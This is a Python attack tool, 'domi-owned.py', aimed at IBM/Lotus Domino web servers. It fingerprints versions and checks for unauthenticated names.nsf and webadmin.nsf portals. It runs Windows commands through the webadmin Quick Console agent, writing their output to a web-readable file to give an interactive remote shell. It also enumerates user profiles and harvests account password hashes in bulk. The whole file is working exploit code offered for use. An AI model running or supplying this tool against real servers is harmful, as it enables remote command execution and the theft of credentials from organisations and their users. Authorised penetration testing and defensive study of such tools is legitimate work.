#!/usr/bin/env python
# Copyright (c) 2015, Brandan Geise [coldfusion]
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import argparse
import cmd
import grequests
import re
import requests
import sys
import urllib
from bs4 import BeautifulSoup

class Interactive(cmd.Cmd):
	"""Interact with Domino Quick Console through web requests"""

	def __init__(self):
		cmd.Cmd.__init__(self)
		self.prompt = 'C:\Windows\System32>'
		self.target = target
		self.username = username
		self.password = password
		self.local_path = local_path

	def emptyline(self):
		pass

	def default(self, line):
		operator = '> '
		self.quick_console(line, operator, self.target, self.username, self.password, self.local_path)

	# Handle Domino Quick Console
	def quick_console(self, command, operator, url, username, password, path):
		session = requests.Session()
		session.auth = (username, password)

		header = {
			'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36',
			'Accept': '*/*',
			'Accept-Language': 'en-US,en;q=0.5',
			'Accept-Encoding': 'gzip, deflate',
			'Referer': "{0}/webadmin.nsf/pgBookmarks?OpenPage".format(url),
			'Connection': 'keep-alive'
		}

		# Encode command
		raw_command = 'load cmd /c {0} {1}"{2}Domino\\data\\domino\\html\\download\\filesets\\log.txt"'.format(command, operator, path)
		encoded_command = urllib.quote(raw_command, safe='')

		quick_console_url = "{0}/webadmin.nsf/agReadConsoleData$UserL2?OpenAgent&Mode=QuickConsole&Command={1}&1446773019134".format(url, encoded_command)
		response_url = "{0}/download/filesets/log.txt".format(url)

		# Send commands and handle cleanup
		send_command = session.get(quick_console_url, headers=header, verify=False)
		if send_command.status_code == 200:
			get_response = session.get(response_url, headers=header, verify=False)
			if get_response.status_code == 200 and '>' in operator:
				print get_response.text
			elif get_response.status_code == 200 and '>' not in operator:
				print 'Unable to delete outfile!'
			elif get_response.status_code == 404 and '>' not in operator:
				print 'Outfile sucessfully deleted'
			else:
				print 'Output file was not found!'
				do_exit
		else:
			print 'Quick Console is unavaliable!'
			do_exit

	def do_EOF(self, line):
		operator = ''
		command = 'del'
		self.quick_console(command, operator, self.target, self.username, self.password, self.local_path)
		return True

	def help_EOF(self):
		print "Use exit or quit to cleanly exit." 

	do_exit = do_quit = do_EOF
	help_exit = help_quit = help_EOF

# Get Domino version
def fingerprint(url, header):
	version_files = ['download/filesets/l_LOTUS_SCRIPT.inf', 
			'download/filesets/n_LOTUS_SCRIPT.inf',
			'download/filesets/l_SEARCH.inf',
			'download/filesets/n_SEARCH.inf'
		]

	for version_file in version_files:
		try:
			version_url = "{0}/{1}".format(url, version_file)
			request = requests.get(version_url, headers=header, verify=False)
			if request.status_code == 200:
				domino_version = re.search("(?i)version=([0-9].[0-9].[0-9])", request.text)
				if domino_version:
					return domino_version.group(1)
			else:
				continue
		except:
			continue

	return None

# Check for open authentication to names.nsf and webadmin.nsf
def check_portals(url, header):
	portals = ['names.nsf', 'webadmin.nsf']
	for portal in portals:
		try:
			portal_url = "{0}/{1}".format(url, portal)
			request = requests.get(portal_url, headers=header, verify=False)
			if request.status_code == 200:
				print_good("{0}/{1} does NOT require authentication!".format(url, portal))
			elif request.status_code == 401:
				print_warn("{0}/{1} requires authentication".format(url, portal))
			else:
				print_error("Could not find {0}!".format(portal))
		except:
			continue

# Determine Domino file structure
def check_access(url, username, password, version):
	session = requests.Session()
	session.auth = (username, password)

	header = {
		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36',
		'Accept': '*/*',
		'Accept-Language': 'en-US,en;q=0.5',
		'Accept-Encoding': 'gzip, deflate',
		'Referer': "{0}/webadmin.nsf/pgBookmarks?OpenPage".format(url),
		'Connection': 'keep-alive'
	}

	local_paths = ['C:\\Program Files\\IBM\\',		# 9.0.1 Windows x64
		'C:\\Program Files\\IBM\\Lotus\\', 			# 8.5.3 Windows x64
		'C:\\Program Files (x86)\\IBM\\', 			# 9.0.1 Windows x86
		'C:\\Program Files (x86)\\IBM\\Lotus\\',	# 8.5.3 Windows x86
		'C:\\Lotus\\'								# Not sure, but just in case
	]

	for local_path in local_paths:
		try:
			# Encode command
			raw_command = 'load cmd /c whoami > "{0}Domino\\data\\domino\\html\\download\\filesets\\log.txt"'.format(local_path)
			encoded_command = urllib.quote(raw_command, safe='')

			quick_console_url = "{0}/webadmin.nsf/agReadConsoleData$UserL2?OpenAgent&Mode=QuickConsole&Command={1}&1446773019134".format(url, encoded_command)
			response_url = "{0}/download/filesets/log.txt".format(url)

			# Do things...
			send_command = session.get(quick_console_url, headers=header, verify=False)
			if send_command.status_code == 200:
				get_response = session.get(response_url, headers=header, verify=False)
				if get_response.status_code == 200:
					get_user = re.search(".+\\\\(.+)", get_response.text)
					if get_user:
						return get_user.group(1), local_path
		except:
			break

	return None, None

# Get user profile URLs
def enum_accounts(url, header, username, password):
	accounts = []
	session = requests.Session()
	session.auth = (username, password)

	for page in range(1, 100000, 30):
		try:
			pages = "{0}/names.nsf/74eeb4310586c7d885256a7d00693f10?ReadForm&Start={1}".format(url, page)
			request = session.get(pages, headers=header, timeout=(60), verify=False)
			if request.status_code == 200:
				soup = BeautifulSoup(request.text, 'lxml')
				empty_page = soup.findAll('h2')
				if empty_page:
					break
				else:
					links = [a.attrs.get('href') for a in soup.select('a[href^=/names.nsf/]')]
					for link in links:
						match = re.search("/(([a-fA-F0-9]{32})/([a-fA-F0-9]{32}))", link)
						if match and match.group(1) not in accounts:
							accounts.append(match.group(1))
						else:
							pass
			else:
				print_error('Not authorized, bad username or password!')
				sys.exit(0)
		except:
			print_error('Could not connect to Domino server!')
			break

	async_requests(accounts, url, header, username, password)

# Asynchronously get hashes
def async_requests(accounts, url, header, username, password):
	NUM_SESSIONS = 20
	sessions = [requests.Session() for i in range(NUM_SESSIONS)]
	async_list = []
	i = 0

	for unid in accounts:
		try:
			profile = "{0}/names.nsf/{1}?OpenDocument".format(url, unid)
			action_item = grequests.get(profile,
				hooks={'response':get_domino_hash},
				session=sessions[i % NUM_SESSIONS],
				auth=(username, password),
				headers=header,
				verify=False
			)
			async_list.append(action_item)
			i += 1

		except KeyboardInterrupt:
			break

	grequests.map(async_list, size=NUM_SESSIONS * 5)

# Dump Domino hashes
def get_domino_hash(response, **kwargs):
	domino_username = None
	domino_hash = None
	soup = BeautifulSoup(response.text, 'lxml')

	try:
		# Get account username
		username_params = ['$dspFullName', '$dspShortName']
		for user_param in username_params:
			domino_username = (soup.find('input', attrs={'name':user_param}))['value']
			if domino_username:
				break
			else:
				continue

		# Get account hash
		hash_params = ['$dspHTTPPassword', 'dspHTTPPassword', 'HTTPPassword']
		for hash_param in hash_params:
			domino_hash = (soup.find('input', attrs={'name':hash_param}))['value']
			if domino_hash:
				# Lotus Notes/Domino 5 Format
				if len(domino_hash) > 22:
					domino_hash = domino_hash.strip('()')
					break
			else:
				continue
	except:
		pass

	if domino_username is None or domino_hash is None:
		pass
	else:
		print "{0}, {1}".format(domino_username, domino_hash)

def print_error(msg):
	print "\033[1m\033[31m[-]\033[0m {0}".format(msg)
	
def print_status(msg):
	print "\033[1m\033[34m[*]\033[0m {0}".format(msg)
		
def print_good(msg):
	print "\033[1m\033[32m[+]\033[0m {0}".format(msg)
	
def print_warn(msg):
	print "\033[1m\033[33m[!]\033[0m {0}".format(msg)

if __name__ == '__main__':
	parser = argparse.ArgumentParser(
		prog='domi-owned.py',
		formatter_class=argparse.RawDescriptionHelpFormatter,
		description=("""
         __________   __________ __________ 
        |          |\|          |          |\\
        |  *    *  |||  *  *  * |        * ||
        |  *    *  |||          |     *    ||
        |  *    *  |||  *  *  * |  *       ||
        |__________|||__________|__________||
        |          || `---------------------`
        |  *    *  ||
        |          ||
        |  *    *  ||
        |__________||
         `----------`

             IBM/Lotus Domino OWNage
"""))
	parser.add_argument('--url', help='Domino server URL', required=False)
	parser.add_argument('-u', '--username', help='Username, default: [None]', default='', required=False)
	parser.add_argument('-p', '--password', help='Password, default: [None]', default='', nargs='+', required=False)
	parser.add_argument('--hashdump', help='Dump Domino hashes', action='store_true', required=False)
	parser.add_argument('--quickconsole', help='Interact with Domino Quick Console', action='store_true', required=False)
	args = parser.parse_args()

	# Define variables
	username = args.username
	password = ' '.join(args.password)

	HEADER = {
		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36',
		'Accept': '*/*',
		'Accept-Language': 'en-US,en;q=0.5',
		'Accept-Encoding': 'gzip, deflate',
		'Connection': 'keep-alive'
	}

	# Process Domino URL
	if args.url:
		url = re.search("((https?)://([a-zA-Z0-9.-]+))", args.url)
		if url:
			target = url.group(1)
		else:
			print_error("Please provide a valid URL!")
			sys.exit(0)
	else:
		parser.parse_args('-h'.split())
		sys.exit(0)

	# Interact with quick console
	if args.quickconsole:
		print_status('Accessing Domino Quick Console...')
		version = fingerprint(target, HEADER)
		who_am_i, local_path = check_access(target, username, password, version)
		if who_am_i:
			print_good("Running as {0}".format(who_am_i))
			Interactive().cmdloop()
		else:
			print_error('Could not access Domino Quick Console!')
			sys.exit(0)

	# Dump hashes
	elif args.hashdump:
		print_status('Dumping Domino account hashes...')
		enum_accounts(target, HEADER, username, password)

	# Fingerprint
	else:
		print_status('Fingerprinting Domino server...')
		version = fingerprint(target, HEADER)
		print_good("Domino version: {0}".format(version))
		check_portals(target, HEADER)
